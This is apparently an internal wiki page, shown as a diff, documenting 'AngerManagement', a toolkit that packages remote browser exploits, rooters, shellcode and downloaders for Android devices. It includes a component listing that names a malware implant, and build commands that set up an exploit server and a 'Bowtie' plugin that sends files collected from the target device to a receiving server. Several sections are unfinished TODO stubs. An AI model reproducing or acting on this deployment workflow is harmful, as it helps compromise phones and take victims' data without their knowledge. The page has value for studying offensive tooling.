@@ -1,0 +1,231 @@
+
+                        AngerManagement_Legacy
+Last updated: 6 March 2015
+
+('toc' missing)
+How to get the AngerManagement project
+Using Quaffle's Hammer (NEW):
+
+In Stash, go to angermanagement_manifest project and copy the Clone HTTPSHypertext Transfer Protocol Secure on the right hand side. ie. https://username@stash.devlan.net/scm/droid/angermanagement_manifest.git
+
+
+In your desired directory, repo init -u https://username@stash.devlan.net/scm/droid/angermanagement_manifest.git
+
+repo sync
+
+
+Using Mission Control (OLD):
+
+In Stash, go to remoterage_manifest project and copy the Clone HTTPSHypertext Transfer Protocol Secure on the right hand side. ie. https://username@stash.devlan.net/scm/droid/remoterage_manifest.git
+
+
+In your desired directory, repo init -u https://username@stash.devlan.net/scm/droid/remoterage_manifest.git
+
+repo syncAll my bowtie changes are in remoterage_manifest's branch note4. You can check out the note4 branch by going to .repo/manifests and "git checkout -b note4 origin/note4."
+
+
+Caution: Multiple files/directories with the same name
+When looking through the AngerManagement project, please do not be confused with multiple directories of the same name. Understand that refactoring is necessary to be done. 
+Here is a list of multiple files/directories with the same name and what's their differences:
+
+remoterage In the past, AngerManagement directory is called remoterage because it is a repo project using remoterage_manifest.git. Within this directory, there might be another directory called remoterage. This remoterage is the remoterage.git. Do not get confused with AngerManagement directory.  
+
+bowtie TODO
+
+
+packager.py TODO
+
+
+angerquake vs angerquaker vs output angerquaker TODO
+
+
+
+Components of AngerManagement
+AngerMangement repo project contains multiple git projects -> outputs angermanagement(NEW)/angerquaker(OLD) executable -> modifies Mission Control's configuration.plist and creates Mission Control plugins in a form of a zip, ie. da_mc.zip. 
+AngerManagement repo project contains multiple git projects where the goal is to output an executable that builds the necessary plugins for Mission Control (MC) to target a particular Android mobile device. This executable is a python zip file called angerquake, but in the future, it will be renamed to angermanagement to fit with the naming convention of all the plugins. The reason why it's called angerquake is because the first plugin incorporated was Dugtrio, and as a Pokemon, Dugtrio's ability is to quake; therefore, it is named angerquake. 
+To build the output of AngerManagement, angerquake, please see the "How to Build Angerquake" section under "Angerquake." 
+To build a Mission Control Server based on the output of AngerManagement, please see the section "How to Build Mission Control Server using AngerManagement."
+To understand what exploits we integrate with AngerManagement (remote exploit, privilege escalation, information leak, etc), please see Android Exploits and Techniques  [NSA] [FBI] [GCHQ] [MI5]
+Angerquake 
+Angerquake git project -> outputs angermanagement(NEW)/angerquaker(OLD) executable
+Angerquake git project builds and outputs the executable python zip file called angerquaker (in the future, it will be called angermanagement). The Angerquake project relies on BodyBuilder project for building the rooters and for providing the command-line interface (docopt), the encryption library (packer.py), and the packaging library (packager.py). Remember that angermanagement(NEW)/angerquaker(OLD) executable, when executed, not only creates the Mission Control plugins based on a particular remote exploit but it also modifies the Mission Control configuration plist, the file needed to configure the Mission Control server based on the specified remote exploit.
+How to Build Angerquake
+To create the angermanagement(NEW)/angerquaker(OLD) executable,  run "make dist" at the root directory of Angerquaker git. If you wanted to clean it first and then build it, you can run "make clean dist."
+You should see two directories being created: build and dist.
+In the build/Release directory, each remote exploit will have its own directory containing everything copied over from its original directory. However, the resource folder, res, will have its contents renamed by the Makefile so that it is not obvious when it is being packaged up into the angerquaker executable and used on the target device. It will also have packer.py from the BodyBuilder project. The build/Release directory should also contain packager directory from the BodyBuilder project and mc_creator executable copied over from MissionControl project's creator. aq contains the packager directory from the BodyBuilder project as well as the logic to take input from the user and package up a Mission Control plugin based on that input. In aq/res directory, it has all the rooters built by BodyBuilder project, all TODO
+For the moment, please ignore the rrhandler directory as we are planning to separate the logic of handling the RRRoidRage (Malware) implant into its own plugin. 
+In the dist directory,  TODO
+ 
+This is roughly what it should look like when you unzip angerquaker:
+Archive: angerquaker warning angerquaker: 18 extra bytes at beginning or within zipfile (attempting to process anyway) Length Date Time Name -------- ---- ---- ---- 6860 03-04-15 11:32 _main_.py  ......................................................... ihuhu 7342 03-04-15 11:32 angerquaker.py  ................................................. 19780 03-04-15 14:51 docopt.py  ........................................................ 10154 03-04-15 14:51 packager.py  .................................................... 7498 03-04-15 14:51 packer.py ........................................................... 0 03-04-15 14:51 res/ 0 03-04-15 14:51 res/_init_.py  ............................................................ 1499 03-04-15 14:51 res/android_ua.zip ............................................. Plugin for parsing user-agent string for RRRoidRage (Malware) implant  6293 03-04-15 14:51 res/bowtie.jar  ....................................................  Java downloader to download Bowtie survey tool ("ant" in bowtie dir) 1401 03-04-15 14:51 res/bowtie_ua.zip ..............................................  Plugin for parsing user-agent string for Bowtie 4699 03-04-15 14:51 res/common.zip ................................................   8023 03-04-15 14:51 res/da.zip ..........................................................  Plugin using Dugtrio remote exploit + RRRoidRage (Malware) implant (contents in res dir are renamed) 4469 03-04-15 14:51 res/download.jar  ..............................................  Java downloader to download RRRoidRage (Malware) implant ("ant" in downloader dir)  1017 03-04-15 14:51 res/droidid.zip  ..................................................  List of devices names in user-agent string 7449 03-04-15 14:51 res/dugtrio_bowtie.zip  ......................................  Plugin using Dugtrio remote exploit + Bowtie survey tool (contents in res dir are renamed) 9440 03-04-15 14:51 res/ei  ................................................................  EerieIndiana binary ("make" in eerieindiana dir) 36644 03-04-15 14:51 res/eis  ............................................................  EerieIndiana shellcode binary ("make shellcode" in eerieindiana dir) 26916 03-04-15 14:51 res/fdsm  ........................................................   Freedroid shellcode manual binary ("make shellcode manual" in freedroid dir)  22586 03-04-15 14:51 res/helios_bowtie.zip  ....................................190600 03-04-15 14:51 res/hghsb  ....................................................  HGH shellcode binary ("make shellcode" in hgh dir) 18800 03-04-15 14:51 res/remote  .....................................................  Remr ("make" in remoterage dir) 32488 03-04-15 14:51 res/sa.zip .......................................................  11669 03-04-15 14:51 res/sk.zip  .......................................................29089 03-04-15 14:51 res/sm.zip  ..................................................... 5554 03-04-15 14:51 res/sp.zip  ..................................................
+
+
+...... 7904 03-04-15 14:51 res/st.zip  ......................................................... 26692 03-04-15 14:51 res/t2  ............................................................  T2 binary ("make" in t2 dir) 57940 03-04-15 14:51 res/t2s ...........................................................  T2 shellcode binary ("make shellcode" in t2 dir) -------- ------- 562806 28 files
+ 
+TODO
+ include plugins: common, android_ua, droidid, necessary exploit plugin, necessary exploit plugin based on each target device
+Angerquaker (aq)
+__main__.py handles the parsing of the user's input when the user runs the angermanagement(NEW)/angerquake(OLD) executable. It calls angerquaker.py's generate() function to create Mission Control plugin based on the user's input. 
+angerquaker.py generates the Mission Control plugin based on the user's input. 
+
+Grab the remote_exploit_plugin.zip based on the remote exploit specified by the user
+Add the necessary plugins – common.zip, android_ua, droidid – into remote_exploit_plugin.zip. In the case for Starmie, it will require the Spearow plugin for information leak, so it will automatically include Spearow. In the case of Bowtie, it will require the bowtie_ua plugin to parse the user-agent string, so it will automatically include bowtie_ua. 
+Revise the Mission Control's configuration.plist based on whether or not the target device will be using either Bowtie survey tool or RRRoidRage (Malware) implant.
+Call BodyBuilder's packager.py's create_remote_partlist to bundle up an encrypted remr, rooter, and downloader. Note that, each remote exploit is paired with a particular list of rooters. Downloader is in charge of downloading either Bowtie survey tool or RRRoidRage (Malware) implant. For this reason, there is two version of downloader: bowtie.jar and downloader.jar. For more information about remr's functionality, see "Remoterage."
+Also note that for #4 above, the encrypted remr, rooter, downloader, and implant RR.zip (if applicable) will be placed in a separate directory based on the target id. For example, if the user specified a target id -i 99, then inside the outputted zip file, it will be placed in <remote exploit>/res/<target id>.
+Output a zip file based on the remote exploit being used. For example, for -d option without the bowtie option included, it will output da_mc.zip.
+
+Plugins
+Bowtie 
+Information being passed in from the plugin to remr is different when you use either the Bowtie survey tool or the RRRoidRage (Malware) implant. For this reason, remote exploit using the Bowtie survey tool has to create a separate plugin to the remote exploit using the RRRoidRage (Malware) implant. This needs to be reworked in the future as it is clunky. 
+bowtie_ua
+bowtie_ua plugin is used by Bowtie survey tool.
+android_ua plugin (in mcplugins/plugins dir) is used by RoidRage implant. 
+If you use bowtie, you will want to use bowtie_ua plugin to parse the target's user-agent string. At the time of its inception, the Bowtie survey tool is not as picky as RoidRage implant what device the target is using because it uses Dugtrio.  Now this is not true, so this might not be necessary in the future. 
+dugtrio_bowtie
+how bowtie_config is being passed in?
+helios_bowtie
+ 
+Dugtrio (da)
+ 
+Helios 
+Salazar(sa)
+Salamander (sm)
+Skor (sk)
+Spearow (sp)
+Starmie (sp)
+
+-------------------------------------------------------------------------------
+ Mission Control 
+-------------------------------------------------------------------------------
+ 
+* timeout
+If the connection to Mission Control failed for the first time (due to slow
+internet connection and etc), the device has to wait until the timeout 
+happens before it can reconnect to Mission Control. The default timeout is
+set to 180 seconds, approximately 3 minutes. 
+ 
+* target id
+If multiple devices have the same target id, whichever device connects to  
+Mission Control first, the other devices are not allowed to connect to  
+Mission Control until the timeout occurs. 
+ 
+* session id  
+If a device has already established a connection with Mission Control and it
+talks with Mission Control without a session id, the communication with 
+Mission Control is terminated. Same vice versa. If it has a session id but 
+not a target id, communication is also terminated.
+ 
+-------------------------------------------------------------------------------
+ Bowtie + Dugtrio
+-------------------------------------------------------------------------------
+ 
+status 2 = beachhead lands, but it doesn't call back to grab the implant
+ 
+For Dugtrio and Bowtie (because Bowtie uses Dugtrio), 
+if the user performed the following actions before status 2, then subsequent 
+actions will NOT continue, and you need to restart the server.
+* close the tab 
+* go to another webpage
+* turn off Wi-Fi
+* turn off device
+* get out of the (browser) application using the center button
+ 
+If the user performed the following actions before status 2, subsequent 
+actions will continue.
+* device goes to lockscreen
+ 
+For Bowtie,
+if one of the files to collect did not exist, Bowtie will continue
+until finish.
+
+Bodybuilder
+Bodybuilder git project
+Bodybuilder git project outputs 
+Bowtie
+Deps
+DroidMake
+Webutils
+Downloader
+Makedeps
+MCPlugins
+MissionControl
+RRCommon
+Rooters
+EerieIndiana
+Freedroid
+HGH
+T2
+Sporker
+Sepol (SE Policy fixes)
+ 
+How to Build Mission Control Server using AngerManagement
+HTTP
+Example is using Dugtrio as the remote exploit
+RR implant
+Assuming that MCServer is hosted at 10.3.2.133:
+
+./mc_creator plist --passphrase 'passwordToRunMCServer' --server-port 3333 --url http://10.3.2.133:3333 mc_config.plist
+Create the Mission Control's configuration plist: mc_config.plist
+For help creating the plist, run ./mc_creator plist --help
+
+
+./angerquaker -d mc_config.plist -i 99 RoidRageImplant_InstPkg.zip
+Create a Dugtrio plugin with id = 99 and the RoidRageImplant_InstPkg.zip. If id is not specified, it will use RoidRageImplant_InstPkg as the id. 
+Note that mc_config.plist is passed in because mc_config.plist will be modified by angerquaker 
+RoidRageImplant_InstPkg.zip will be encrypted and placed in da_mc.zip's internal directory: da/res/99/rr
+For help creating the plugin, run ./angerquaker
+
+
+./mc_creator server mctest mc_config.plist da_mc.zip 
+Create the Mission Control Server using the mc_config.plist (Mission Control's configuration plist) and da_mc.zip (Dugtrio plugin)
+For help creating the server, run ./mc_creator server --help
+
+
+python mctestRun the mctest (Mission Control server) that contains the Dugtrio plugin
+
+On the device, go to the browser and browse: http://10.3.2.133:3333/?id=99
+
+Bowtie survey tool
+Assuming that MCServer is hosted at 10.3.2.133 and the server to receive Bowtie's collected files is hosted at 10.3.2.155:
+
+./mc_creator plist --passphrase 'passwordToRunMCServer' --server-port 3333 --url http://10.3.2.133:3333 mc_config.plist
+Create the Mission Control's configuration plist: mc_config.plist
+For help creating the plist, run ./mc_creator plist --help
+
+
+./angerquaker -d -b 'passwordToEncryptBowtieCollectedFiles' --bowtieurl "https://10.3.2.155/bt.php" --bowtiecfg /path/to/bowtie_config.xml -i 99 mc_config.plist
+Create a Dugtrio plugin specified for Bowtie with the passwordToEncryptBowtieCollectedFiles so that when you decrypt it later, you know what the password should be. Also, you need to give the url to the server that receives Bowtie's collected files as well as the path to the configuration file that specifies what files to collect on the target device. Id is 99.
+Note that mc_config.plist is passed in because mc_config.plist will be modified by angerquaker
+For help in creating the plugin, run ./angerquaker
+
+
+./mc_creator server mctest mc_config.plist dugtrio_bowtie_mc.zip 
+Create the Mission Control Server using the mc_config.plist (Mission Control's configuration plist) and dugtrio_bowtie_mc.zip (Dugtrio plugin specified for Bowtie)
+For help creating the server, run ./mc_creator server --help
+
+
+python mctestRun the mctest (Mission Control server) that contains the Dugtrio plugin 
+
+On the device, go to browser and browse: http://10.3.2.133:3333/?id=99Unlike the RoidRage implant, once remr calls on bowtie.jar, it will send all collected files to http://10.3.2.155
+
+
+ 
+ 
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+|
+                    
